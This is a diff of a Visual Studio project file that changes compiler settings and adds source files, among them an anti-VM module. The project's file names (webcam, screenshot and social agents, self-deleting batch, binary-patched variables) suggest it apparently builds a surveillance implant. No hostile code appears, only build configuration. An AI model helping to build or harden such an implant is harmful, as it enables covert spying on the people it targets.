@@ -132,13 +132,15 @@
       <WarningLevel>Level3</WarningLevel>
       <PrecompiledHeader>
       </PrecompiledHeader>
-      <Optimization>Disabled</Optimization>
+      <Optimization>Full</Optimization>
       <FunctionLevelLinking>false</FunctionLevelLinking>
-      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <IntrinsicFunctions>false</IntrinsicFunctions>
       <PreprocessorDefinitions>WIN32;NDEBUG;_WINDOWS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
       <ExceptionHandling>false</ExceptionHandling>
       <BufferSecurityCheck>false</BufferSecurityCheck>
+      <OmitFramePointers>true</OmitFramePointers>
+      <CallingConvention>Cdecl</CallingConvention>
     </ClCompile>
     <Link>
       <SubSystem>Windows</SubSystem>
@@ -204,6 +206,7 @@
     <ClCompile Include="aes_alg.cpp" />
     <ClCompile Include="agent_social.cpp" />
     <ClCompile Include="agent_webcam.cpp" />
+    <ClCompile Include="antivm.cpp" />
     <ClCompile Include="api.cpp" />
     <ClCompile Include="base64.cpp" />
     <ClCompile Include="bits.cpp" />
@@ -218,16 +221,18 @@
     <ClCompile Include="sha1.cpp" />
     <ClCompile Include="sync_thread.cpp" />
     <ClCompile Include="upgrade.cpp" />
+    <ClCompile Include="utils.cpp" />
     <ClCompile Include="win_http.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="aes_alg.h" />
     <ClInclude Include="agent_social.h" />
+    <ClInclude Include="antivm.h" />
     <ClInclude Include="api.h" />
     <ClInclude Include="autodelete_batch.h" />
     <ClInclude Include="base64.h" />
     <ClInclude Include="binpatched_vars.h" />
-    <ClInclude Include="bits.h" />
+    <ClInclude Include="mybits.h" />
     <ClInclude Include="crypt.h" />
     <ClInclude Include="agent_device.h" />
     <ClInclude Include="agent_screenshot.h" />
@@ -240,6 +245,7 @@
     <ClInclude Include="sha1.h" />
     <ClInclude Include="sync_thread.h" />
     <ClInclude Include="upgrade.h" />
+    <ClInclude Include="utils.h" />
     <ClInclude Include="win_http.h" />
   </ItemGroup>
   <ItemGroup>
